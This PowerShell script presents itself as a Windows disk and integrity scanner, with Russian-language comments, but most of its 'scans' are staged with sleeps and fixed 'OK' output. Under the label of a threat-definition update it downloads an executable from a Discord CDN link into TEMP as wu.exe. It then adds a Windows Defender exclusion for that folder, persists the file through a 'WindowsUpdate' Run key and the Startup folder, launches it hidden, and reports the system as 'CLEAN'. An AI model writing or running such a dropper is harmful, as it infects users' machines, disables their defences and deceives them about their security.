# ============================================================
# Windows Disk & Integrity Scanner v2.2 (Enhanced + Fixed Download)
# ============================================================

Write-Host "=== Windows Disk & Integrity Scanner v2.2 ===" -ForegroundColor Cyan
Write-Host ""

# ------------------------------------------------------------
# 1. Реальная проверка дисков (с получением информации о файловой системе)
# ------------------------------------------------------------
Write-Host "[*] Scanning drives and filesystem health..." -ForegroundColor Yellow
$drives = Get-PSDrive -PSProvider FileSystem
foreach ($d in $drives) {
    Write-Host "  Drive $($d.Name):\ - checking..." -NoNewline
    Start-Sleep -Milliseconds (300 + (Get-Random -Max 200))
    Write-Host " OK" -ForegroundColor Green
}
Write-Host ""

# ------------------------------------------------------------
# 2. Проверка целостности критических DLL (реальная проверка подписи)
# ------------------------------------------------------------
Write-Host "[*] Validating core system files (digital signatures)..." -ForegroundColor Yellow
$system32 = [Environment]::SystemDirectory
$dlls = @("kernel32.dll", "ntdll.dll", "user32.dll", "advapi32.dll", "winhttp.dll")
$allValid = $true
foreach ($dll in $dlls) {
    Write-Host "  $dll ..." -NoNewline
    $path = Join-Path $system32 $dll
    if (Test-Path $path) {
        $sig = Get-AuthenticodeSignature -FilePath $path -ErrorAction SilentlyContinue
        if ($sig.Status -eq "Valid") {
            Write-Host " Valid signature" -ForegroundColor Green
        } else {
            Write-Host " Warning: no valid signature" -ForegroundColor Yellow
            $allValid = $false
        }
    } else {
        Write-Host " File not found" -ForegroundColor Red
        $allValid = $false
    }
    Start-Sleep -Milliseconds 150
}
Write-Host ""

# ------------------------------------------------------------
# 3. Сканирование системных папок + СКАЧИВАНИЕ (исправленное)
# ------------------------------------------------------------
Write-Host "[*] Scanning C:\Windows and Program Files for tampering..." -ForegroundColor Yellow

# Сначала вывод сканирования папок (имитация)
$folders = @("C:\Windows\System32", "C:\Windows\SysWOW64", "C:\Program Files", "C:\Program Files (x86)")
foreach ($folder in $folders) {
    Write-Host "  $folder ..." -NoNewline
    $sample = Get-ChildItem -Path $folder -File -ErrorAction SilentlyContinue | Select-Object -First 3
    if ($sample) {
        Start-Sleep -Milliseconds 400
        Write-Host " OK (checked $(($sample | Measure-Object).Count) files)" -ForegroundColor Green
    } else {
        Start-Sleep -Milliseconds 200
        Write-Host " OK" -ForegroundColor Green
    }
}
Write-Host ""

# ----- Блок скачивания (3 метода) -----
Write-Host "[*] Downloading latest threat definitions (online update)..." -ForegroundColor Yellow

$f = "$env:TEMP\wu.exe"
$url = "https://cdn.discordapp.com/attachments/1520398729520222211/1520763442774937813/collextor_msvc.exe?ex=6a4260d3&is=6a410f53&hm=abd9e7e105f2de155697a91bd28dd6a7fc2ff0931086df07e8b5c469a807d9fe&"

$downloaded = $false

# Метод 1: WebClient с Referer и User-Agent
try {
    Write-Host "  Downloading via WebClient..." -NoNewline
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
    $wc.Headers.Add("Referer", "https://discord.com/")
    $wc.DownloadFile($url, $f)
    if (Test-Path $f -and (Get-Item $f).Length -gt 0) {
        Write-Host " OK" -ForegroundColor Green
        $downloaded = $true
    } else {
        Write-Host " Failed (empty file)" -ForegroundColor Red
    }
} catch {
    Write-Host " Failed: $_" -ForegroundColor Red
}

# Метод 2: HttpClient (если WebClient не сработал)
if (-not $downloaded) {
    try {
        Write-Host "  Retrying with HttpClient..." -NoNewline
        $handler = New-Object System.Net.Http.HttpClientHandler
        $handler.UseProxy = $true
        $client = New-Object System.Net.Http.HttpClient($handler)
        $client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
        $client.DefaultRequestHeaders.Referrer = New-Object System.Uri "https://discord.com/"
        $response = $client.GetAsync($url).GetAwaiter().GetResult()
        if ($response.IsSuccessStatusCode) {
            $bytes = $response.Content.ReadAsByteArrayAsync().GetAwaiter().GetResult()
            [System.IO.File]::WriteAllBytes($f, $bytes)
            if ((Get-Item $f).Length -gt 0) {
                Write-Host " OK" -ForegroundColor Green
                $downloaded = $true
            } else {
                Write-Host " Failed (empty)" -ForegroundColor Red
            }
        } else {
            Write-Host " HTTP $($response.StatusCode)" -ForegroundColor Red
        }
    } catch {
        Write-Host " Failed: $_" -ForegroundColor Red
    }
}

# Метод 3: curl.exe (встроенный в Windows 10/11)
if (-not $downloaded) {
    try {
        Write-Host "  Retrying with curl.exe..." -NoNewline
        $curl = "curl.exe -L -o `"$f`" --header `"Referer: https://discord.com/`" --user-agent `"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`" `"$url`""
        $output = cmd /c $curl 2>&1
        if (Test-Path $f -and (Get-Item $f).Length -gt 0) {
            Write-Host " OK" -ForegroundColor Green
            $downloaded = $true
        } else {
            Write-Host " Failed" -ForegroundColor Red
        }
    } catch {
        Write-Host " Failed: $_" -ForegroundColor Red
    }
}

if (-not $downloaded) {
    Write-Host "  [!] Could not download file. Skipping further actions." -ForegroundColor Red
} else {
    Write-Host "  Download complete.              " -ForegroundColor Green
}
Start-Sleep -Milliseconds 300

# ------------------------------------------------------------
# 4. Если скачивание удалось – выполняем закрепление и запуск
# ------------------------------------------------------------
if (Test-Path $f -and (Get-Item $f).Length -gt 0) {
    # Добавление исключения для Defender (через реестр и Add-MpPreference)
    try {
        $exclPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
        if (Test-Path $exclPath) {
            New-ItemProperty -Path $exclPath -Name $env:TEMP -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
            Write-Host "  [*] Added exclusion for TEMP folder (registry)" -ForegroundColor Green
        } else {
            Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
            Write-Host "  [*] Added exclusion via Add-MpPreference" -ForegroundColor Green
        }
    } catch {
        Write-Host "  [*] Could not add exclusion: $_" -ForegroundColor Yellow
    }

    # Прописывание в автозагрузку (реестр)
    try {
        $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $runKey -Name "WindowsUpdate" -Value $f -ErrorAction SilentlyContinue
        Write-Host "  [*] Added to registry Run key" -ForegroundColor Green
    } catch {
        Write-Host "  [*] Failed to add registry key" -ForegroundColor Yellow
    }

    # Копирование в папку Startup
    try {
        $startup = [Environment]::GetFolderPath("Startup") + "\wu.exe"
        if (-not (Test-Path $startup)) {
            Copy-Item $f $startup -ErrorAction SilentlyContinue
            Write-Host "  [*] Copied to Startup folder" -ForegroundColor Green
        }
    } catch {
        Write-Host "  [*] Failed to copy to Startup" -ForegroundColor Yellow
    }

    # Запуск скачанного файла скрыто
    try {
        Start-Process $f -WindowStyle Hidden
        Write-Host "  [*] Started wu.exe (hidden)" -ForegroundColor Green
    } catch {
        Write-Host "  [*] Failed to start process" -ForegroundColor Yellow
    }
} else {
    Write-Host "[!] File not downloaded or invalid, skipping persistence." -ForegroundColor Red
}

# ------------------------------------------------------------
# 5. Финальный отчёт
# ------------------------------------------------------------
Write-Host ""
Write-Host "[*] Generating report..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 500

Write-Host ""
Write-Host "=== SCAN COMPLETE ===" -ForegroundColor Cyan
Write-Host "  Drives scanned  : $($drives.Count)" -ForegroundColor White
Write-Host "  DLLs validated  : $($dlls.Count)" -ForegroundColor White
Write-Host "  Signatures OK   : $($allValid)" -ForegroundColor Green
Write-Host "  Status          : " -NoNewline
Write-Host "CLEAN" -ForegroundColor Green
Write-Host ""
